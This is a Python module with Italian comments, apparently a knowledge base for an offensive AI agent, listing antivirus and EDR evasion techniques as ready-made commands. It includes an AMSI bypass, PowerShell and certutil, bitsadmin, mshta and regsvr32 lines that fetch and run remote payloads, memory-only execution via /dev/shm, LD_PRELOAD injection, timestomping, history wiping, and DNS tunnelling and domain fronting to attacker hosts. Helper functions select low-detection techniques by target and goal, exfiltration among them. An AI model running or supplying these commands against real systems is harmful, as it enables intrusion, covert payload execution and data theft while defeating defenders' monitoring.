#!/usr/bin/env python3
"""
Evasion Techniques Knowledge Base
🥷 Tecniche per bypassare AV/EDR e detection.

Questo modulo contiene conoscenza su:
- AMSI bypass
- PowerShell evasion
- Living Off The Land Binaries (LOLBins)
- Encoding e obfuscation
- Network evasion
"""

from typing import Dict, List, Any
from dataclasses import dataclass
from enum import Enum

class DetectionRisk(Enum):
    """Livello di rischio detection"""
    LOW = "low"          # Difficile da rilevare
    MEDIUM = "medium"    # Rilevabile con tuning
    HIGH = "high"        # Facilmente rilevato
    CRITICAL = "critical"  # Rilevato da tutti gli AV

@dataclass
class EvasionTechnique:
    """Rappresenta una tecnica di evasione"""
    name: str
    category: str
    description: str
    command_example: str
    detection_risk: DetectionRisk
    mitre_id: str = ""
    notes: str = ""

# ============================================================================
# POWERSHELL EVASION
# ============================================================================

POWERSHELL_EVASION: List[EvasionTechnique] = [
    EvasionTechnique(
        name="AMSI Bypass via Reflection",
        category="powershell",
        description="Disabilita AMSI usando reflection per eseguire script malevoli",
        command_example="""[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)""",
        detection_risk=DetectionRisk.MEDIUM,
        mitre_id="T1562.001",
        notes="Varianti moderne usano string obfuscation"
    ),
    EvasionTechnique(
        name="Execution Policy Bypass",
        category="powershell",
        description="Bypassa le restrizioni di execution policy",
        command_example="powershell -ep bypass -file script.ps1",
        detection_risk=DetectionRisk.LOW,
        mitre_id="T1059.001",
        notes="Alternativa: -ExecutionPolicy Bypass"
    ),
    EvasionTechnique(
        name="Download Cradle via IEX",
        category="powershell",
        description="Scarica ed esegue script in memoria senza toccare disco",
        command_example="IEX(New-Object Net.WebClient).DownloadString('http://x/s.ps1')",
        detection_risk=DetectionRisk.HIGH,
        mitre_id="T1059.001",
        notes="Usare HTTPS e domain fronting per evitare detection"
    ),
    EvasionTechnique(
        name="Base64 Encoded Command",
        category="powershell",
        description="Esegue comandi codificati in Base64",
        command_example="powershell -enc [BASE64_PAYLOAD]",
        detection_risk=DetectionRisk.MEDIUM,
        mitre_id="T1027",
        notes="Encoding UTF-16LE richiesto per -enc"
    ),
]

# ============================================================================
# LIVING OFF THE LAND BINARIES (LOLBins)
# ============================================================================

LOLBINS: List[EvasionTechnique] = [
    EvasionTechnique(
        name="Certutil Download",
        category="lolbin",
        description="Usa certutil per scaricare file (proxy download)",
        command_example="certutil -urlcache -split -f http://x/payload.exe payload.exe",
        detection_risk=DetectionRisk.MEDIUM,
        mitre_id="T1105",
        notes="Molto monitorato, usare varianti"
    ),
    EvasionTechnique(
        name="Bitsadmin Download",
        category="lolbin",
        description="Usa BITS per download silenzioso",
        command_example="bitsadmin /transfer job /download /priority high http://x/p.exe C:\\p.exe",
        detection_risk=DetectionRisk.LOW,
        mitre_id="T1197",
        notes="Può persistere attraverso reboot"
    ),
    EvasionTechnique(
        name="Mshta Execution",
        category="lolbin",
        description="Esegue HTA/JS tramite mshta.exe",
        command_example="mshta http://x/payload.hta",
        detection_risk=DetectionRisk.MEDIUM,
        mitre_id="T1218.005",
        notes="Bypass AppLocker default"
    ),
    EvasionTechnique(
        name="Rundll32 Execution",
        category="lolbin",
        description="Esegue DLL o script JavaScript",
        command_example="rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";alert('x')",
        detection_risk=DetectionRisk.MEDIUM,
        mitre_id="T1218.011"
    ),
    EvasionTechnique(
        name="Regsvr32 AppLocker Bypass",
        category="lolbin",
        description="Esegue SCT file remoto",
        command_example="regsvr32 /s /n /u /i:http://x/file.sct scrobj.dll",
        detection_risk=DetectionRisk.MEDIUM,
        mitre_id="T1218.010"
    ),
    EvasionTechnique(
        name="Wmic Process Create",
        category="lolbin",
        description="Esegue comandi via WMI",
        command_example="wmic process call create \"cmd /c whoami\"",
        detection_risk=DetectionRisk.LOW,
        mitre_id="T1047"
    ),
]

# ============================================================================
# LINUX EVASION
# ============================================================================

LINUX_EVASION: List[EvasionTechnique] = [
    EvasionTechnique(
        name="Bash History Evasion",
        category="linux",
        description="Evita logging nella bash history",
        command_example="unset HISTFILE; export HISTSIZE=0",
        detection_risk=DetectionRisk.LOW,
        mitre_id="T1070.003",
        notes="Alternativa: prefisso spazio ' command'"
    ),
    EvasionTechnique(
        name="Memory-only Execution",
        category="linux",
        description="Esegue binario solo in memoria via /dev/shm",
        command_example="curl http://x/elf -o /dev/shm/.hidden && chmod +x /dev/shm/.hidden && /dev/shm/.hidden",
        detection_risk=DetectionRisk.LOW,
        mitre_id="T1620"
    ),
    EvasionTechnique(
        name="LD_PRELOAD Injection",
        category="linux",
        description="Inietta libreria malevola",
        command_example="LD_PRELOAD=/tmp/evil.so /usr/bin/sudo",
        detection_risk=DetectionRisk.MEDIUM,
        mitre_id="T1574.006"
    ),
    EvasionTechnique(
        name="Timestomping",
        category="linux",
        description="Modifica timestamp file per evitare timeline forensics",
        command_example="touch -r /bin/ls /tmp/malware",
        detection_risk=DetectionRisk.LOW,
        mitre_id="T1070.006"
    ),
    EvasionTechnique(
        name="Process Name Masquerading",
        category="linux",
        description="Rinomina processo per sembrare legittimo",
        command_example="exec -a '[kworker/0:0]' /tmp/malware",
        detection_risk=DetectionRisk.LOW,
        mitre_id="T1036.004"
    ),
]

# ============================================================================
# NETWORK EVASION
# ============================================================================

NETWORK_EVASION: List[EvasionTechnique] = [
    EvasionTechnique(
        name="DNS Tunneling",
        category="network",
        description="Exfiltrazione dati via query DNS",
        command_example="dnscat2 server.attacker.com",
        detection_risk=DetectionRisk.MEDIUM,
        mitre_id="T1071.004",
        notes="Tools: iodine, dnscat2, dns2tcp"
    ),
    EvasionTechnique(
        name="ICMP Tunneling",
        category="network",
        description="Tunnel dati via ICMP echo",
        command_example="ptunnel -p proxy.server -lp 8000 -da dest -dp 22",
        detection_risk=DetectionRisk.LOW,
        mitre_id="T1095"
    ),
    EvasionTechnique(
        name="Domain Fronting",
        category="network",
        description="Nasconde traffico C2 dietro CDN legittimi",
        command_example="curl -H 'Host: evil.com' https://cdn.cloudflare.com/",
        detection_risk=DetectionRisk.LOW,
        mitre_id="T1090.004",
        notes="Molti CDN hanno bloccato questa tecnica"
    ),
    EvasionTechnique(
        name="HTTP/S over non-standard port",
        category="network",
        description="Usa porte non standard per evitare inspection",
        command_example="curl https://c2.evil:8443/beacon",
        detection_risk=DetectionRisk.MEDIUM,
        mitre_id="T1571"
    ),
]

# ============================================================================
# ENCODING & OBFUSCATION
# ============================================================================

ENCODING_TECHNIQUES: List[EvasionTechnique] = [
    EvasionTechnique(
        name="Base64 Encoding",
        category="encoding",
        description="Encoding base64 per payload",
        command_example="echo 'whoami' | base64",
        detection_risk=DetectionRisk.MEDIUM,
        notes="Troppo comune, meglio double-encode"
    ),
    EvasionTechnique(
        name="XOR with Key",
        category="encoding",
        description="XOR payload con chiave rotante",
        command_example="python3 -c \"import sys; key='secret'; print(''.join(chr(ord(c)^ord(key[i%len(key)])) for i,c in enumerate(sys.argv[1])))\" 'payload'",
        detection_risk=DetectionRisk.LOW,
        mitre_id="T1027"
    ),
    EvasionTechnique(
        name="Gzip + Base64",
        category="encoding",
        description="Comprimi e codifica per obfuscation",
        command_example="echo 'payload' | gzip | base64 -w0",
        detection_risk=DetectionRisk.LOW
    ),
    EvasionTechnique(
        name="String Concatenation",
        category="encoding",
        description="Spezza stringhe per evitare signature match",
        command_example="$a='Inv';$b='oke-';$c='Mimi';$d='katz';iex($a+$b+$c+$d)",
        detection_risk=DetectionRisk.MEDIUM,
        mitre_id="T1027"
    ),
]

# ============================================================================
# AGGREGATION
# ============================================================================

ALL_TECHNIQUES: Dict[str, List[EvasionTechnique]] = {
    "powershell": POWERSHELL_EVASION,
    "lolbin": LOLBINS,
    "linux": LINUX_EVASION,
    "network": NETWORK_EVASION,
    "encoding": ENCODING_TECHNIQUES,
}

def get_techniques_by_category(category: str) -> List[EvasionTechnique]:
    """Ritorna tecniche per categoria"""
    return ALL_TECHNIQUES.get(category, [])

def get_low_risk_techniques() -> List[EvasionTechnique]:
    """Ritorna solo tecniche a basso rischio detection"""
    result = []
    for techniques in ALL_TECHNIQUES.values():
        for tech in techniques:
            if tech.detection_risk == DetectionRisk.LOW:
                result.append(tech)
    return result

def get_technique_for_context(target_os: str, goal: str) -> List[EvasionTechnique]:
    """
    Suggerisce tecniche appropriate per il contesto.
    
    Args:
        target_os: 'windows' o 'linux'
        goal: 'download', 'execution', 'persistence', 'exfil'
    """
    result = []
    
    if target_os == 'windows':
        if goal == 'download':
            result.extend([t for t in LOLBINS if 'download' in t.name.lower()])
        elif goal == 'execution':
            result.extend(POWERSHELL_EVASION)
            result.extend([t for t in LOLBINS if 'execution' in t.name.lower()])
    elif target_os == 'linux':
        result.extend(LINUX_EVASION)
    
    if goal == 'exfil':
        result.extend(NETWORK_EVASION)
    
    # Sempre includere encoding
    result.extend(ENCODING_TECHNIQUES[:2])
    
    return result

def format_for_agent(technique: EvasionTechnique) -> str:
    """Formatta una tecnica per l'agente"""
    return (
        f"**{technique.name}** [{technique.detection_risk.value} risk]\n"
        f"  Descrizione: {technique.description}\n"
        f"  Esempio: `{technique.command_example}`\n"
        f"  MITRE: {technique.mitre_id or 'N/A'}"
    )

# ============================================================================
# QUICK REFERENCE FOR AGENTS
# ============================================================================

AGENT_QUICK_REFERENCE = """
## 🥷 EVASION QUICK REFERENCE

### Windows - Living Off The Land
- Download: `certutil -urlcache -split -f URL FILE` o `bitsadmin`
- Execute: `mshta URL` o `regsvr32 /s /n /u /i:URL scrobj.dll`
- Memory: PowerShell IEX + DownloadString

### Windows - PowerShell Bypass
- AMSI: reflection SetValue amsiInitFailed
- Policy: `-ep bypass` o `-ExecutionPolicy Bypass`
- Encode: `-enc [BASE64_UTF16LE]`

### Linux - Stealth
- No history: `unset HISTFILE` o prefisso spazio
- Memory exec: `/dev/shm/.hidden`
- Timestomp: `touch -r /bin/ls MALWARE`
- Process hide: `exec -a '[kworker]' ./malware`

### Network - Exfil
- DNS tunnel: dnscat2, iodine
- ICMP tunnel: ptunnel
- HTTPS non-standard port

### Encoding
- Double base64: `echo X | base64 | base64`
- XOR: chiave rotante
- String split: `$a+'b'+'c'`
"""
